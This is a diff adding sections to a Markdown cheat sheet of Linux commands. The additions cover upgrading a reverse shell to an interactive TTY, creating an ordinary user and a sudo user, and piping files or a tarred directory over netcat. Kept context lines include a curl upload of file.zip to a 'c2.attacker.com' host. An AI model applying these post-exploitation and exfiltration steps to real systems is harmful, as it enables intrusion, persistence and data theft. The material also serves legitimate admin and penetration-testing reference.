@@ -116,9 +116,54 @@ curl -k --user 'root:toor' --upload-file file.zip https://127.0.0.1:8000/file.zi
 curl -k --user 'root:haxorz' --upload-file file.zip https://c2.attacker.com:443/file.zip
 ```
 
+## Upgrade Reverse shell to fully interactive TTY[^6]
+* In reverse shell 
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+<Ctrl-Z>
+```
+* In Attacker console
+```bash
+stty raw -echo
+fg
+```
+* In reverse shell
+```bash
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
+```
+
+## Create a user
+```bash
+# Create a user
+useradd user -U -s /bin/bash
+# Create a sudo user
+useradd user -G sudo -U -s /bin/bash
+```
+
+## Transfer files using nc (netcat)[^7]
+* Basic
+```bash
+# Receiving
+nc -l -p 9999 > received_file.txt
+# Sending
+nc 192.168.0.1 9999 < received_file.txt
+```
+* With compression
+```bash
+# Receiving
+nc -l -p 9999 | xz -dc | tar xvf -
+# Sending
+tar cvf - . | xz -c | nc 192.168.0.1 9999
+```
+
 
 [^1]: [Stack Overflow](https://stackoverflow.com/questions/3724786/how-to-diff-two-file-lists-and-ignoring-place-in-list)
 [^2]: [StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)
 [^3]: [It's FOSS](https://itsfoss.com/recover-deleted-files-linux/)
 [^4]: [Fedora Project](https://docs.fedoraproject.org/en-US/quick-docs/how-to-edit-iptables-rules/)
 [^5]: [Phoenixnap](https://phoenixnap.com/kb/iptables-tutorial-linux-firewall)
+[^6]: [6c2e6e2e - Spawning interactive reverse shells with TTY](https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e)
+[^7]: [Tutorials Technology - How to transfer files over the network using Netcat ](https://tutorials.technology/tutorials/How-to-transfer-files-over-the-network-using-Netcat.html)
